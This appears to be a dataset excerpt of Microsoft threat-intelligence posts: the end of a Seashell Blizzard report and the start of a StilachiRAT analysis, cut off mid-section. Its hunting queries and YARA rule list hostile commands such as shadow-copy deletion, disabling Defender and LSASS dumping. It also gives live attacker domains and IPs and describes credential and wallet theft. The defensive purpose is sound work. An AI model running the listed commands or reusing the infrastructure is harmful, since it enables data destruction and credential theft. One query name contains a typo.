distinct patterns of exploitation.\nModification of web access sign-in portals The initial access subgroup uses rogue JavaScript inserted into otherwise legitimate sign-in portals.\nThis malicious JavaScript collects and sends clear text usernames and passwords to actor-controlled infrastructure as they are submitted in real time by users of the affected organization.\nWe assess that this method has likely afforded the subgroup credentials to support lateral movement within several organizations.\nMicrosoft Threat Intelligence has tracked the following actor-controlled infrastructure linked to this unique credential collection method when modifying legitimate OWA sign-in pages: - hwupdates[.]com - cloud-sync[.]org - 103.201.129[.]130 Modification of DNS configurations Microsoft Threat Intelligence assesses with moderate confidence that the initial access subgroup has modified DNS A record configurations for select targets.\nWhile the purpose of these modifications is unclear, due to the nature of affected systems, it is possible that they may have been purposed to intercept credentials from critical authentication services.\nConclusion Given that Seashell Blizzard is Russia’s cyber tip of the spear in Ukraine, Microsoft Threat Intelligence assesses that this access subgroup will continue to innovate new horizontally scalable techniques to compromise networks both in Ukraine and globally in support of Russia’s war objectives and evolving national priorities.\nThis subgroup, which is characterized within the broader Seashell Blizzard organization by its near-global reach, represents an expansion in both the geographical targeting conducted by Seashell Blizzard and the scope of its operations.\nAt the same time, Seashell Blizzard’s far-reaching, opportunistic access methods likely offer Russia expansive opportunities for niche operations and activities that will continue to be valuable over the medium term.\nMitigation and protection guidance To harden networks against the Seashell Blizzard activity listed above, defenders can implement the following: Strengthen operating environment configuration - Utilize a vulnerability management system, such as Microsoft Defender Vulnerability Management, to manage vulnerabilities, weaknesses, and remediation efforts across your environment’s operating systems, software inventories, and network devices. -\nRequire multifactor authentication (MFA).\nWhile certain attacks such as AiTM phishing attempt to circumvent MFA, implementation of MFA remains an essential pillar in identity security and is highly effective at stopping a variety of threats. -\nLeverage phishing-resistant authentication methods such as FIDO Tokens, or Microsoft Authenticator with passkey.\nAvoid telephony-based MFA methods to avoid risks associated with SIM-jacking. -\nImplement Entra ID Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps. -\nEncourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. -\nOrganizations can also use Microsoft Defender External Attack Surface Management (EASM) , a tool that continuously discovers and maps digital attack surface to provide an external view of your online infrastructure.\nEASM leverages vulnerability and infrastructure data to generate Attack Surface Insights, reporting that highlights key risks to a given organization. -\nEnable Network Level Authentication for Remote Desktop Service connections. -\nEnable AppLocker to restrict specific software tools prohibited within the organization, such as reconnaissance, fingerprinting, and RMM tools, or grant access to only specific users.\nStrengthen Microsoft Defender for Endpoint configuration - Ensure that tamper protection is enabled in Microsoft Defender for Endpoint. -\nEnable network protection in Microsoft Defender for Endpoint. -\nTurn on web protection. -\nRun endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode.\nEDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach. -\nConfigure investigation and remediation in full automated mode to let Microsoft Defender for Endpoint take immediate action on alerts to resolve breaches, significantly reducing alert volume. -\nMicrosoft Defender XDR customers can turn on the following attack surface reduction rules to prevent common attack techniques used by threat actors. -\nBlock executable content from email client and webmail - Block executable files from running unless they meet a prevalence, age, or trusted list criterion - Block execution of potentially obfuscated scripts - Block JavaScript or VBScript from launching downloaded executable content - Block process creations originating from PSExec and WMI commands Strengthen Microsoft Defender Antivirus configuration - Turn on cloud-delivered protection in Microsoft Defender Antivirus, or the equivalent for your antivirus product, to cover rapidly evolving attacker tools and techniques.\nCloud-based machine learning protections block a majority of new and unknown variants. -\nEnable Microsoft Defender Antivirus scanning of downloaded files and attachments. -\nEnable Microsoft Defender Antivirus real-time protection. -\nTurn on PUA protection in block mode in Microsoft Defender Antivirus Strengthen Microsoft Defender for Office 365 configuration - Turn on Safe Links and Safe Attachments in Microsoft Defender for Office 365. -\nEnable Zero-hour auto purge (ZAP) in Microsoft Defender for Office 365 to quarantine sent mail in response to newly acquired threat intelligence and retroactively neutralize malicious phishing, spam, or malware messages that have already been delivered to mailboxes. -\nInvest in advanced anti-phishing solutions that monitor incoming emails and visited websites.\nMicrosoft Defender for Office 365 merges incident and alert management across email, devices, and identities, centralizing investigations for email-based threats. -\nConfigure Microsoft Defender for Office 365 to recheck links on click. -\nUse the Attack Simulator in Microsoft Defender for Office 365 to run realistic, yet safe, simulated phishing and password attack campaigns.\nRun spear-phishing (credential harvest) simulations to train end-users against clicking URLs in unsolicited messages and disclosing credentials.\nStrengthen Microsoft Defender for Identity configuration - Prevent clear text credential exposure. -\nReduce lateral movement paths that may be used by attackers. -\nIdentify legacy components that may introduce security vulnerabilities.\nMicrosoft Defender XDR detections Microsoft Defender Antivirus Microsoft Defender Antivirus detects this threat as the following malware: - HackTool:Win64/ShadowLink.\nA!dha - HackTool:Win64/ShadowLink.\nB!dha - Exploit:Python/CVE-2024-1709 - Rnasom:Win32/Inc.MA - BackDoor:PHP/Remoteshell.\nV - Trojan:Win32/LocalOlive.\nA!dha - Trojan:Win32/LocalOlive.\nB!dha - Trojan:Win32/LocalOlive.\nC!dha Microsoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts can indicate associated threat activity: - Seashell Blizzard activity group The following alerts might also indicate threat activity related to this threat.\nNote, however, these alerts also can be triggered by unrelated threat activity. -\nPossible Seashell Blizzard activity - Suspicious Atera installation via ScreenConnect - Suspicious command execution via ScreenConnect - Suspicious sequence of exploration activities - CredentialDumpingViaEsentutlDetector - Suspicious behavior by cmd.exe was observed - SQL Server login using xp_cmdshell - Suspicious port scan activity within an RDP session - Suspicious connection to remote service - Suspicious usage of remote management software - New local admin added using Net commands - Sensitive data was extracted from registry - Suspicious Scheduled Task Process Launched - Potential human-operated malicious activity - Compromised account conducting hands-on-keyboard attack - Sensitive file access for possible data exfiltration or encryption - Possible Fortinet FortiClientEMS vulnerability exploitation - Possible target of NTLM credential theft - Possible exploitation of ProxyShell vulnerabilities - Possibly malicious use of proxy or tunneling tool - Hidden dual-use tool launch attempt Microsoft Defender for Cloud The following alerts might also indicate threat activity associated with this threat.\nThese alerts, however, can be triggered by unrelated threat activity and are not monitored in the status cards provided with this report. -\nCommunication with suspicious domain identified by threat intelligence - Suspicious PowerShell Activity Detected - Detected suspicious combination of HTA and PowerShell - Detected encoded executable in command line data - Detected obfuscated command line Threat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog.\nThese reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.\nMicrosoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence to get more information about this threat actor.\nMicrosoft Defender Threat Intelligence - Seashell Blizzard - Seashell Blizzard uses new ShadowLink variant - Seashell Blizzard exploiting vulnerabilities to install Atera Agent for post-compromise activities - Seashell Blizzard launches destructive attack against local Ukrainian government, Storm-1512 takes credit - Credential Theft via Modification of Outlook Web Access (OWA) Login Pages - Seashell Blizzard Targeting Zimbra Servers Using Malicious Email Attachment - Seashell Blizzard Uses TOR Hidden Services on Targets for Persistence and Evasion Hunting queries Microsoft Defender XDR The following sample queries let you search for a week’s worth of events.\nTo explore up to 30 days’ worth of raw data to inspect events in your network and locate potential PowerShell-related indicators for more than a week, go to the Advanced hunting page > Query tab, select the calendar dropdown menu to update your query to hunt for the Last 30 days.\nScreenConnect Surface the possible exploitation of ScreenConnect to launch suspicious commands.\nDeviceProcessEvents | where InitiatingProcessParentFileName endswith \"ScreenConnect.ClientService.exe\" | where (FileName in~ (\"powershell.exe\", \"powershell_ise.exe\", \"cmd.exe\") and ProcessCommandLine has_any (\"System.\nDirectoryServices.\nActiveDirectory.\nDomain\", \"hidden -encodedcommand\", \"export-registry\", \"compress-archive\", \"wget -uri\", \"curl -Uri\", \"curl -sko\", \"ipconfig /all\", \"& start /B\", \"start msiexec /q /i\", \"whoami\", \"net user\", \"net group\", \"localgroup administrators\", \"dsquery\", \"samaccountname=\", \"query session\", \"adscredentials\", \"o365accountconfiguration\", \"-dumpmode\", \"-ssh\", \"o or (FileName =~ \"wget.exe\" and ProcessCommandLine contains \"http\") or (FileName =~ \"mshta.exe\" and ProcessCommandLine contains \"http\") or (FileName =~ \"curl.exe\" and ProcessCommandLine contains \"http\") or ProcessCommandLine has_all (\"powershell\", \"-command\", \"curl\") or ProcessCommandLine has_any (\"E:jscript\", \"e:vbscript\", \"start msiexec /q /i\") or ProcessCommandLine has_all (\"reg add\", \"DisableAntiSpyware\", @\"\\Microsoft\\Windows Defender\") or ProcessCommandLine has_all (\"reg add\", \"DisableRestrictedAdmin\", @\"CurrentControlSet\\Control\\Lsa\") or ProcessCommandLine has_all (\"vssadmin\", \"delete\", \"shadows\") or ProcessCommandLine has_all (\"vssadmin\", \"list\", \"shadows\") or ProcessCommandLine has_all (\"wmic\", \"process call create\") or ProcessCommandLine has_all (\"wmic\", \"delete\", \"shadowcopy\") or ProcessCommandLine has_all (\"wmic\", \"shadowcopy\", \"call create\") or ProcessCommandLine has_all (\"wbadmin\", \"delete\", \"catalog\") or ProcessCommandLine has_all (\"ntdsutil\", \"create full\") or (ProcessCommandLine has_all (\"schtasks\", \"/create\") and not(ProcessCommandLine has \"shutdown\")) or (ProcessCommandLine has \"nltest\" and ProcessCommandLine has_any (\"domain_trusts\", \"dclist\", \"all_trusts\")) or (ProcessCommandLine has \"lsass\" and ProcessCommandLine has_any (\"procdump\", \"tasklist\", \"findstr\")) or FileName in~ (\"tasklist.exe\", \"ssh.exe\", \"icacls.exe\", \"certutil.exe\", \"calc.exe\", \"bitsadmin.exe\", \"accesschk.exe\", \"mshta.exe\", \"winrm.exe\", \"dsquery.exe\", \"makecab.exe\", \"hh.exe\", \"pcalua.exe\", \"regsvr32.exe\", \"cmstp.exe\", \"esentutl.exe\", \"dnscmd.exe\", \"gpscript.exe\", \"msdt.exe\", \"msra.exe\", \"odbcconf.exe\") | where not(ProcessCommandLine has_any (\"servicedesk.atera.com\", \"support.csolve.net\", \"lt.tech-keys.com\", \"certutil -hashfile\")) FortiClient EMS log capture If you believe your FortiClient has been exploited before patching, this query may help with further investigation.\nAccording to Horizon3 research, the C:\\Program Files (x86)\\Fortinet\\FortiClientEMS\\logs log file can be examined to identify malicious activity.\nRun the following query to surface devices with this log file for further investigation.\nDeviceFileEvents | where FileName contains @\"C:\\Program Files (x86)\\Fortinet\\FortiClientEMS\\logs\" | distinct DeviceName Additionally, Horizon3 noted that this SQL vulnerability could allow for remote code execution (RCE) using the xp_cmdshell functionality of Microsoft SQL Server.\nThe SQL logs can also be examined for evidence of xp_cmdshell being leveraged to spawn a Windows command shell.\nAccording to Microsoft research, the following query could help surface exploitation activity related to this vulnerability.\nDeviceProcessEvents | where InitiatingProcessFileName == \"sqlservr.exe\" | where FileName =~ \"cmd.exe\" | where ProcessCommandLine has_any (\"webclient\", \"downloadstring\", \"http\", \"https\", \"downloadfile\") | where InitiatingProcessCommandLine has_all (\"sqlservr.exe\", \"-sFCEMS\") Tor service Find services associated with Tor.\nDeviceEvents | where ActionType == 'ServiceInstalled' | extend JSON = parse_json(AdditionalFields) | where JSON.ServiceName has 'tor' YARA rule Use the following Yara rule to find malicious JavaScript inserted into OWA sign-in pages.\nrule injected_cred_logger_owa { strings: $owa = \"<!--\nOwaPa\" $jq = \"jquery\" $ajax = \".ajax\" $keypress = \".keypress\" $which = \"e.which == 13\" $encoding1 = \"btoa\" $encoding2 = \"unescape\" $encoding3 = \"encodeURIComponent\" $m1 = \"GET\" $m2 = \"POST\" condition: $owa and $jq and $ajax and $keypress and $which and (2 of ($encoding*)) and (1 of ($m*)) } Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\nWhile the below query is not linked to any specific threat actor, it is effective in surfacing network connectivity that may indicate use of remote monitoring and management program ScreenConnect.\nImplementing this query can help you stay vigilant and safeguard your organization from unauthorized use of RMM software: Below are the queries using Sentinel ASIM Functions to hunt threats across both Microsoft first-party and third-party data sources.\nASIM also supports deploying parsers to specific workspaces from GitHub, using an ARM template or manually.\nBelow query can be used to hunt normalized Network Session events using the ASIM unifying parser _Im_NetworkSession for IOCs: let lookback = 30d; let ioc_ip_addr = dynamic([\"103.201.129.130\", \"104.160.6.2\", \"195.26.87.209\"]); let ioc_domains = dynamic([\"hwupdates.com\", \"cloud-sync.org\"]); _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor Below query can be used to hunt normalized Web Session events using the ASIM unifying parser _Im_WebSession for IOCs: let lookback = 30d; let ioc_ip_addr = dynamic([\"103.201.129.130\", \"104.160.6.2\", \"195.26.87.209\"]); let ioc_url_patterns = dynamic([\"hwupdates.com\", \"cloud-sync.org\",\"def.aspx\"]); _Im_WebSessionn(starttime=todatetime(ago(lookback)), endtime=now()) | where url has_any (ioc_url_patterns) or DstIpAddr has_any (ioc_ip_addr) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor Indicators of compromise | Indicator | Type | | def.aspx | LocalOlive web shell | | akfcjweiopgjebvh@proton.me | Actor-controlled email address | | ohipfdpoih@proton.me | Actor-controlled email address | | miccraftsor@outlook.com | Actor-controlled email address | | amymackenzie147@protonmail.ch | Actor-controlled email address | | ehklsjkhvhbjl@proton.me | Actor-controlled email address | | MirrowSimps@outlook.com | Actor-controlled email address | | MsChSoft.exe | Chisel tunneling utility | | MsNan.exe | Chisel tunneling utility | | Msoft.exe | Chisel tunneling utility | | Chisel.exe | Chisel tunneling utility | | Win.exe | Chisel tunneling utility | | MsChs.exe | Chisel tunneling utility | | MicrosoftExchange32.exe | Chisel tunneling utility | | Sc.exe | Rocstun tunneling utility | | 103.201.129[.]130 | Seashell Blizzard infrastructure | | 104.160.6[.]2 | Seashell Blizzard infrastructure | | 195.26.87[.]209 | Seashell Blizzard infrastructure | | hwupdates[.]com | Seashell Blizzard infrastructure | | cloud-sync[.]org | Seashell Blizzard infrastructure | | c7379b2472b71ea0a2ba63cb7178769d27b27e1d00785bfadac0ae311cc88d8b | LocalOlive | | b38f1906680c80e1606181b3ccb8539dab5af2a7222165c53cdd68d09ec8abb0 | LocalOlive | | 9f3d8252e8f3169751a705151bdf675ac194bfd8457cbe08e1f3c17d7e9e9be2 | LocalOlive | | 68c7aab670ee9d7461a4a8f06333994f251dc79813934166421091e2f1fa145c | LocalOlive | | b9ef2e948a9b49a6930fc190b22cbdb3571579d37a4de56564e41a2ef736767b | Chisel | | 636e04f0618dd578d107f440b1cf6c910502d160130adae5e415b2dd2b36abcb | LocalOlive | | 148.251.53[.]222 | Seashell Blizzard infrastructure | | 89.149.200[.]91 | | | 17738a27bb307b3cb7bd571934a398223e170842005f1725c46c7075f14e90fe | Seashell Blizzard infrastructure | | cab97e837a3fc095bf59703574cbfa7e60fb10991101ba9bfc9bbf294c18fd97 | LocalOlive | References - https://nvd.nist.gov/vuln/detail/CVE-2024-1709 - https://nvd.nist.gov/vuln/detail/CVE-2023-48788 - https://www.cisa.gov/news-events/ics-alerts/ir-alert-h-16-056-01 - https://www.justice.gov/opa/pr/six-russian-gru-officers-charged-connection-worldwide-deployment-destructive-malware-and - https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE4Vwwd - https://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains - https://cloud.google.com/blog/topics/threat-intelligence/trojanized-windows-installers-ukrainian-government - https://cert.gov.ua/article/6278706 - https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm - https://nvd.nist.gov/vuln/detail/CVE-2021-34473 - https://nvd.nist.gov/vuln/detail/CVE-2022-41352 - https://nvd.nist.gov/vuln/detail/CVE-2023-32315 - https://nvd.nist.gov/vuln/detail/CVE-2023-42793 - https://nvd.nist.gov/vuln/detail/CVE-2023-23397 - https://medium.com/@laurent.mandine/chisel-the-hackers-hidden-tunnel-for-stealthy-network-access-acdcdaafeabd - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on LinkedIn at https://www.linkedin.com/showcase/microsoft-threat-intelligence, and on X (formerly Twitter) at https://x.com/MsftSecIntel.\nTo hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast: https://thecyberwire.com/podcasts/microsoft-threat-intelligence.","num_sentences":178,"metadata":{"source":"blog","platform":"Microsoft","filename":"BadPilot"}}
{"id":52,"title":"StilachiRAT analysis: From system reconnaissance to cryptocurrency theft | Microsoft Security Blog","publish_date":"2024-11-28","link":"https://www.microsoft.com/en-us/security/blog/2025/03/17/stilachirat-analysis-from-system-reconnaissance-to-cryptocurrency-theft/","clean_text":"In November 2024, Microsoft Incident Response researchers uncovered a novel remote access trojan (RAT) we named StilachiRAT that demonstrates sophisticated techniques to evade detection, persist in the target environment, and exfiltrate sensitive data.\nAnalysis of the StilachiRAT’s WWStartupCtrl64.dll module that contains the RAT capabilities revealed the use of various methods to steal information from the target system, such as credentials stored in the browser, digital wallet information, data stored in the clipboard, as well as system information.\nMicrosoft has not yet attributed StilachiRAT to a specific threat actor or geolocation.\nBased on Microsoft’s current visibility, the malware does not exhibit widespread distribution at this time.\nHowever, due to its stealth capabilities and the rapid changes within the malware ecosystem, we are sharing these findings as part of our ongoing efforts to monitor, analyze, and report on the evolving threat landscape.\nMicrosoft security solutions can detect activities related to attacks that use StilachiRAT.\nTo help defenders protect their network, we are also sharing mitigation guidance to help reduce the impact of this threat, detection details, and hunting queries.\nMicrosoft continues to monitor information on the delivery vector used in these attacks.\nMalware like StilachiRAT can be installed through multiple vectors; therefore, it is critical to implement security hardening measures to prevent the initial compromise.\nThis blog presents our detailed findings on all the key capabilities of StilachiRAT, which include: - System reconnaissance: Collects comprehensive system information, including operating system (OS) details, hardware identifiers, camera presence, active Remote Desktop Protocol (RDP) sessions, and running graphical user interface (GUI) applications, allowing detailed profiling of the target system. -\nDigital wallet targeting: Scans for configuration data of 20 different cryptocurrency wallet extensions for the Google Chrome browser. -\nCredential theft: Extracts and decrypts saved credentials from Google Chrome, gaining access to usernames and passwords stored in the browser. -\nCommand-and-control (C2) connectivity: Establishes communication with remote C2 servers using TCP ports 53, 443, or 16000, enabling remote command execution and potentially SOCKS like proxying. -\nCommand execution: Supports a variety of commands from the C2 server, including system reboots, log clearing, registry manipulation, application execution, and system suspension. -\nPersistence mechanisms: Achieves persistence through the Windows service control manager (SCM) and uses watchdog threads to ensure self-reinstatement if removed. -\nRDP monitoring: Monitors RDP sessions, capturing active window information and impersonating users, allowing for potential lateral movement within networks. -\nClipboard and data collection: Continuously monitors clipboard content, actively searching for sensitive data like passwords and cryptocurrency keys, while tracking active windows and applications. -\nAnti-forensics and evasion: Employs anti-forensic tactics by clearing event logs, detecting analysis tools, and implementing sandbox-evading behaviors to avoid detection.\nTechnical analysis of key capabilities System reconnaissance StilachiRAT gathers extensive system information, including OS details, device identifiers, BIOS serial numbers, and camera presence.\nInformation is collected through the Component Object Model (COM) Web-based Enterprise Management (WBEM) interfaces using WMI Query Language (WQL).\nBelow are some of the queries it executes: Serial number Camera OS / System info (server, model, manufacturer) Additionally, the malware creates a unique identification on the infected device that is derived from the system’s serial number and attackers’ public RSA key.\nThe information is stored in the registry under a CLSID key.\nDigital wallet targeting StilachiRAT targets a list of specific cryptocurrency wallet extensions for the Google Chrome browser.\nIt accesses the settings in the following registry key and validates if any of the extensions are installed: \\SOFTWARE\\Google\\Chrome\\PreferenceMACs\\Default\\extensions.settings The malware targets the following cryptocurrency wallet extensions: | Cryptocurrency wallet extension name | Chrome extension identifier | | Bitget Wallet (Formerly BitKeep) | jiidiaalihmmhddjgbnbgdfflelocpak | | Trust Wallet | egjidjbpglichdcondbcbdnbeeppgdph | | TronLink | ibnejdfjmmkpcnlpebklmnkoeoihofec | | MetaMask (ethereum) | nkbihfbeogaeaoehlefnkodbefgpgknn | | TokenPocket | mfgccjchihfkkindfppnaooecgfneiii | | BNB Chain Wallet | fhbohimaelbohpjbbldcngcnapndodjp | | OKX Wallet | mcohilncbfahbmgdjkbpemcciiolgcge | | Sui Wallet | opcgpfmipidbgpenhmajoajpbobppdil | | Braavos – Starknet Wallet | jnlgamecbpmbajjfhmmmlhejkemejdma | | Coinbase Wallet | hnfanknocfeofbddgcijnmhnfnkdnaad | | Leap Cosmos Wallet | fcfcfllfndlomdhbehjjcoimbgofdncg | | Manta Wallet | enabgbdfcbaehmbigakijjabdpdnimlg | | Keplr | dmkamcknogkgcdfhhbddcghachkejeap | | Phantom | bfnaelmomeimhlpmgjnjophhpkkoljpa | | Compass Wallet for Sei | anokgmphncpekkhclmingpimjmcooifb | | Math Wallet | afbcbjpbpfadlkmhmclhkeeodmamcflc | | Fractal Wallet | agechnindjilpccclelhlbjphbgnobpf | | Station Wallet | aiifbnbfobpmeekipheeijimdpnlpgpp | | ConfluxPortal | bjiiiblnpkonoiegdlifcciokocjbhkd | | Plug | cfbfdhimifdmdehjmkdobpcjfefblkjm | Credential theft StilachiRAT extracts Google Chrome’s encryption_key from the local state file in a user’s directory.\nHowever, since the key is encrypted when Chrome is first installed, it uses Windows APIs that rely on current user’s context to decrypt the master key.\nThis allows access to the stored credentials in the password vault.\nThe stored credentials are extracted from the following locations: - %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State – stores Chrome’s configuration data, including the encrypted key. - %\nLOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data – stores entered user credentials.\nThe “Login Data” stores information using an SQLite database and the malware retrieves credentials using the following query: Command-and-control (C2) There are two configured addresses for the C2 server – one is stored in obfuscated form and the other is an IP address converted to its binary format (instead of a regular string): - app.95560[.]cc - 194.195.89[.]47 The communications channel is established using TCP ports 53, 443, or 16000, selected randomly.\nAdditionally, the malware checks for presence of tcpview.exe and will not proceed if one is present.\nIt also delays initial connection by two hours, presumably to evade detection.\nOnce connected, a list of active windows is sent to the server.\nAdditional technical findings regarding C2 communications functionality are listed in the section below.\nPersistence mechanisms StilachiRAT can be launched both as a Windows service or a standalone component.\nIn both cases, there is a mechanism in place to ensure the malware isn’t removed.\nA watchdog thread monitors both the EXE and dynamic link library (DLL) files used by the malware by periodically polling for their presence.\nIf found absent, the files can be recreated from an internal copy obtained during initialization.\nLastly, the Windows service component can be recreated by modifying the relevant registry settings and restarting it through the SCM.\nRDP monitoring StilachiRAT monitors RDP sessions by capturing foreground window information and duplicating security tokens to impersonate users.\nThis is particularly risky on RDP servers hosting administrative sessions as it could enable lateral movement within networks.\nThe malware obtains the current session and actively launches foreground windows as well as enumerates all other RDP sessions.\nFor each identified session, it will access the Windows Explorer shell and duplicate its privileges or security token.\nThe malware then gains capabilities to launch applications with these newly obtained privileges.\nData collection StilachiRAT collects a variety of user data, including software installation records and active applications.\nIt monitors active GUI windows, their title bar text, and file location, and sends this information to the C2 server, potentially allowing attackers to track user behavior.\nClipboard monitoring StilachiRAT has a functionality that is responsible for monitoring clipboard data.\nSpecifically, the malware can periodically read the clipboard, extract text based on search expressions, and then exfiltrate this data.\nClipboard monitoring is continuous, with targeted searches for sensitive information such as passwords, cryptocurrency keys, and potentially personal identifiers.\nThe list below includes the regular search expressions used to extract certain credentials.\nThese are associated with the Tron Cryptocurrency blockchain that is popular in Asia, especially in China.\n| Credential | Regular expression to extract credential | | TRX Address | `\\bT[0-9a-zA-Z]{33}\\b` | | TRX Key | `\\b(0x)?[0-9a-fA-F]{64}\\b` | | TRX Pass | `^\\s*\\b([0-9]*[.]*[a-wy-z][a-z]{2,}[ \\t]*\\b){12}\\s*(\\n\\$)` | | TRX Pass | `^\\s*\\b([0-9]*[.]*?[a-wy-z][a-z]{2,}\\s*\\b){12}\\s*(\\n\\$)` | The same search expressions are then used to iterate files in the following locations: - %USERPROFILE%\\Desktop - %USERPROFILE%\\Recent Anti-forensic measures StilachiRAT displays anti-forensic behavior by clearing event logs and checking certain system conditions to evade detection.\nThis includes looping checks for analysis tools and sandbox timers that prevent its full activation in virtual environments commonly used for malware analysis.\nAdditionally, Windows API calls are obfuscated in multiple ways and a custom algorithm is used to encode many text strings and values.\nThis significantly slows down analysis time since extrapolating higher level logic and code design becomes a more complex effort.\nThe malware employs API-level obfuscation techniques to impede manual analysis, specifically by concealing its use of Windows APIs (e.g., RegOpenKey()).\nInstead of referencing API names directly, it encodes them as checksums that are resolved dynamically at runtime.\nWhile this is a common technique in malware, the authors have introduced additional layers of obfuscation.\nPrecomputed API checksums are stored in multiple lookup tables, each masked with an XOR value.\nDuring launch, the malware selects the appropriate table based on the hashed API name, applies the correct XOR mask to decode the value, and dynamically resolves the corresponding Windows API function.\nThe resolved function pointer is then cached, but with an additional XOR mask applied, preventing straightforward memory scans from identifying API references.\nCommands launched from the C2 server StilachiRAT can launch various commands received from the C2 server.\nThese commands include system reboot, log clearing, credential theft, executing applications, and manipulating system windows.\nAdditionally, it can suspend the system, modify Windows registry values, and enumerate open windows, indicating a versatile command set for both espionage and system manipulation.\nThe C2 server’s command structure assigns specific numbers to what commands it will initiate.\nThe following section presents details on the said commands.\n07 – Dialog box Uses the Windows API function ShowHTMLDialogEx() to display a dialog box with rendered HTML contents from a supplied URL.\n08 – Log clearing Given an event log type, the relevant Windows APIs are used to open and then clear the log entries.\n09 – System reboot Adjusts its own executing privileges to enable system shutdown and uses an undocumented Windows API to perform the action.\n13 – Network sockets Appears to contain capability to receive a network address from C2 server and establish a new outbound connection.\n14 – TCP incoming Accepts an incoming network connection on the supplied TCP port.\n15 – Terminate If there’s an open network connection, then close it and disable the Windows service controlling this process.\nThis appears to be the self-removal (uninstall) command.\n16 – Initiate application The malware creates a console window and initiates a command to launch the program provided by the C2 operator using the WinExec() API.\n19 – Enumerate Windows Iterates all windows of the current desktop to look for a requested title bar text.\nThis might allow the operator to access specific GUI applications and their contents, both onscreen and clipboard.\n26 – Suspend Uses the SetSuspendState() API to put the system into either a suspended (sleep) state or hibernation.\n30 – Chrome credentials Launches the earlier mentioned functionality to steal Google Chrome passwords.\nMitigations Malware like StilachiRAT can be installed through various vectors.\nThe following mitigations can help prevent this type of malware from infiltrating the system and reduce the attack surface: - In some cases, RATs can masquerade as legitimate software or software updates.\nAlways download software from the official website of the software developer or from reputable sources. -\nEncourage users to use Microsoft Edge and other web browsers that support SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. -\nTurn on Safe Links and Safe Attachments for Office 365.\nIn organizations with Microsoft Defender for Office 365, Safe Links scanning protects your organization from malicious links that are used in phishing and other attacks.\nSpecifically, Safe Links provides URL scanning and rewriting of inbound email messages during mail flow, and time-of-click verification of URLs and links in email messages, Microsoft Teams, and supported Office 365 apps.\nSafe Attachments provides an additional layer of protection for email attachments that have already been scanned by anti-malware protection in Exchange Online Protection (EOP). -\nEnable network protection in Microsoft Defender for Endpoint to prevent applications or users from accessing malicious domains and other malicious content on the internet.\nYou can audit network protection in a test environment to view which apps would be blocked before enabling network protection.\nGeneral hardening guidelines: - Ensure that tamper protection is enabled in Microsoft Dender for Endpoint. -\nRun endpoint detection and response in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode. -\nConfigure investigation and remediation in full automated mode to let Microsoft Defender for Endpoint take immediate action on alerts to resolve breaches, significantly reducing alert volume. -\nTurn on Potentially unwanted applications (PUA) protection in block mode in Microsoft Defender Antivirus.\nPUA are a category of software that can cause your machine to run slowly, display unexpected ads, or install other software that might be unexpected or unapproved. -\nTurn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. -\nTurn on Microsoft Defender Antivirus real-time protection.\nMicrosoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below.\nMicrosoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.\nCustomers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.\nMicrosoft Defender Antivirus Microsoft Defender Antivirus detects this threat as the following malware: - TrojanSpy:Win64/Stilachi.\nA Microsoft Defender for Endpoint The following alerts might indicate threat activity related to this threat.\nNote, however, that these alerts can be also triggered by unrelated threat activity. -\nA process was injected with potentially malicious code - Process hollowing detected - Suspicious service launched - Possible theft of passwords and other sensitive web browser information Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following pre-built promptbooks to automate incident response or investigation tasks related to this threat: - Incident investigation - Microsoft User analysis - Threat actor profile - Threat Intelligence 360 report based on MDTI article - Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.\nHunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following query to find related activity in their networks: Look for suspicious outbound network connections Monitor network traffic for malicious activity caused by remote access trojans by focusing on identifying unusual outbound connections, irregular port activity, and suspicious data exfiltration patterns that may indicate RAT presence.\nOutbound 